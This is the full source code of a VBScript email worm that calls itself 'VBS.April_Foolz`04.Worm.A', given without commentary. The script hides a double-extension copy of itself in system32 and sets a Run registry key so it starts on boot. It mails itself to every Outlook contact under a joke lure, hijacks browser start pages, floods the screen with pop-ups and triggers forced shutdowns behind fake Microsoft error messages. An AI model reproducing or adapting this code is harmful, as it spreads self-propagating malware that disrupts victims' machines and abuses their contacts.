   On Error Resume Next
   Set NEWREG = CreateObject("WScript.Shell")
   NEWREG.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Auto~Start","C:\WINDOWS\system32\1001 Jokes.txt.vbs"
   Set COPYNEWREG = CreateObject("Scripting.FileSystemObject")
   COPYNEWREG.CopyFile WScript.ScriptFullName, "C:\WINDOWS\system32\1001 Jokes.txt.vbs"

   Set HIDEVBS = CreateObject("Scripting.FileSystemObject")
   Const ATTRIB1 = 34
   Set VBSHIDDEN = HIDEVBS.GetFile("C:\WINDOWS\system32\1001 Jokes.txt.vbs")
   VBSHIDDEN.Attributes = ATTRIB1

   Set NEWBATCH = CreateObject("Scripting.FileSystemObject")
   Set BATCH1 = NEWBATCH.CreateTextFile("C:\WINDOWS\system32\XPR.bat")
   BATCH1.WriteLine "CLS"
   BATCH1.WriteLine "@ECHO OFF"
   BATCH1.WriteLine "SHUTDOWN -r -t 30 -c ""System_Failed:    Microsoft xp has encounted some errors, To fix the errors your system will restart in (30) seconds.!"&""""
   BATCH1.WriteLine "CLS"
   BATCH1.Close

   Set HIDEBATCH1 = CreateObject("Scripting.FileSystemObject")
   Const ATTRIB2 = 34
   Set BATCH1HIDDEN = HIDEBATCH1.GetFile("C:\WINDOWS\system32\XPR.bat")
   BATCH1HIDDEN.Attributes = ATTRIB2

   Set NEWBATCH = CreateObject("Scripting.FileSystemObject")
   Set BATCH2 = NEWBATCH.CreateTextFile("C:\WINDOWS\system32\XPS.bat")
   BATCH2.WriteLine "CLS"
   BATCH2.WriteLine "@ECHO OFF"
   BATCH2.WriteLine "SHUTDOWN -s -t 30 -c ""System_Overload:    Microsoft Xp has encounted some serious errors and will shutdown in (30) seconds, For safety reasons please DO NOT turn on your system for 5 minutes.!"&""""
   BATCH2.WriteLine "CLS"
   BATCH2.Close

   Set HIDEBATCH2 = CreateObject("Scripting.FileSystemObject")
   Const ATTRIB3 = 34
   Set BATCH2HIDDEN = HIDEBATCH2.GetFile("C:\WINDOWS\system32\XPS.bat")
   BATCH2HIDDEN.Attributes = ATTRIB3

   Set HTML = CreateObject("Scripting.FileSystemObject")
   Set APRILFOOLZ = HTML.CreateTextFile("C:\WINDOWS\system\AFJ.html")
   APRILFOOLZ.WriteLine "<HTML>"
   APRILFOOLZ.WriteLine "<HEAD>"
   APRILFOOLZ.WriteLine "<TITLE> ApRiL Fo0lz j0k3..!! </TITLE>"
   APRILFOOLZ.WriteLine "<BODY>"
   APRILFOOLZ.WriteLine "<BODY BGCOLOR= 000011 TEXT= FF0000>"
   APRILFOOLZ.WriteLine "<P ALIGN= Center><FONT SIZE =+4 FONT COLOR= EEEEEE><B> H@ H@ H@ H@..!! </B></P></FONT>"
   APRILFOOLZ.WriteLine " <BR>"
   APRILFOOLZ.WriteLine " <BR>"
   APRILFOOLZ.WriteLine "<P ALIGN= Center><FONT SIZE= +5 FONT COLOR= EEEEEE><B> This is a </B></P></FONT>"
   APRILFOOLZ.WriteLine " <BR>"
   APRILFOOLZ.WriteLine "<P ALIGN= Center><FONT SIZE= +6><B> <--- ApRiL Fo0lz DaY j0k3..!! ---> </B></P></FONT>"
   APRILFOOLZ.WriteLine " <BR>"
   APRILFOOLZ.WriteLine " <BR>"
   APRILFOOLZ.WriteLine "<P ALIGN= Center><FONT SIZE= +2 FONT COLOR= EEEEEE><B> So the <U>BIG</U> <U>FUCKING</U> Joke is <U>YOU</U>,<B><P>"
   APRILFOOLZ.WriteLine "<P ALIGN= Center><FONT SIZE= +2><B> Because I`ve just <U>INFECTED</U> your computer with a <U>VIRUS...!!</U></B><P>"
   APRILFOOLZ.WriteLine "<P ALIGN= Center><FONT SIZE= +2><B> Have a nice day..!! </B></P></FONT>"
   APRILFOOLZ.WriteLine " </BR>"
   APRILFOOLZ.WriteLine " </BR>"
   APRILFOOLZ.WriteLine " </BR>"
   APRILFOOLZ.WriteLine " </BR>"
   APRILFOOLZ.WriteLine " </BR>"
   APRILFOOLZ.WriteLine "</BODY>"
   APRILFOOLZ.WriteLine "</HTML>"
   APRILFOOLZ.Close

   Set HIDEHTML = CreateObject("Scripting.FileSystemObject")
   Const ATTRIB4 = 34
   Set HTMLHIDDEN = HIDEHTML.GetFile("C:\WINDOWS\system\AFJ.html")
   HTMLHIDDEN.Attributes = ATTRIB4

   On Error Resume Next
   Set FSO = CreateObject ("Scripting.FileSystemObject")
   Set OUTLOOKAPP = CreateObject ("Outlook.Application")
   Set ENTRYCOUNT = WScript.CreateObject ("Outlook.Application")
   Set MAPISPACE = ENTRYCOUNT.GetNameSpace ("MAPI")
   Set VICTIMSADDRESS = MAPISPACE.AddressLists (1)
   For RELOOP = 1 To VICTIMSADDRESS.AddressEntries.Count
   Set JUNKMAIL = OUTLOOKAPP.CreateItem (0)
   JUNKMAIL.To = OUTLOOKAPP.GetNameSpace("MAPI").AddressLists(1).AddressEntries(RELOOP)
   JUNKMAIL.Subject = "Re: Hello, You got to have a quick read of one of these hilarious jokes..!"
   JUNKMAIL.Body = "<--- The joke is on YOU...!!! --->"
   JUNKMAIL.Attachments.Add Wscript.ScriptFullName
   JUNKMAIL.DeleteAfterSubmit = True
   JUNKMAIL.Send
   Next
   OUTLOOKAPP.Quit

   If Month(Now) = 4 And Day(Now) = 1 Then
   Set RENEWREG = CreateObject("WScript.Shell")
   RENEWREG.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\FullScreen","yes"
   RENEWREG.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Search Page","C:\WINDOWS\system\AFJ.html"
   RENEWREG.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","C:\WINDOWS\system\AFJ.html"

   Randomize
   RNDNUMBER = Int(100 * Rnd)
   For RELOOP = 1 To RNDNUMBER
   Set XX = CreateObject("WScript.Shell")
   XX.Run "C:\WINDOWS\system\AFJ.html", 1, True
   MsgBox "Is this annoying you yet.?", 32, "VBS.April_Foolz`04.Worm.A"
   Next
   Randomize
   RNDNUMBER = Int((2 * Rnd) + 1)
   If RNDNUMBER = 1 Then
   Set XX = CreateObject("WScript.Shell")
   XX.Run "C:\WINDOWS\system32\XPR.bat"
   ElseIf RNDNUMBER = 2 Then
   Set XX = CreateObject("WScript.Shell")
   XX.Run "C:\WINDOWS\system32\XPS.bat"
   ElseIf Month(Now) = 4 And Day(Now) = 14 Then
   REPAIRDAMAGE()
   End If
   End If

   Sub REPAIRDAMAGE()
   Set RENEWREG = CreateObject("WScript.Shell")
   RENEWREG.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\FullScreen","no"
   RENEWREG.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Search Page","http://www.microsoft.com/isapi/redir.dll?prd=ie&ar=iesearch"
   RENEWREG.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.microsoft.com"

   Set DELETEREG = CreateObject("WScript.Shell")
   DELETEREG.RegDelete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Auto~Start"
   Set DELETEBATCH1 = CreateObject("Scripting.FileSystemObject")
   DELETEBATCH1.DeleteFile ("C:\WINDOWS\system32\XPR.bat")
   Set DELETEBATCH2 = CreateObject("Scripting.FileSystemObject")
   DELETEBATCH2.DeleteFile ("C:\WINDOWS\system32\XPS.bat")
   Set DELETEHTML = CreateObject("Scripting.FileSystemObject")
   DELETEHTML.DeleteFile ("C:\WINDOWS\system\AFJ.html")
   Set DELETEVBS = CreateObject("Scripting.FileSystemObject")
   DELETEVBS.DeleteFile ("C:\WINDOWS\system32\1001 Jokes.txt.vbs")
   End Sub
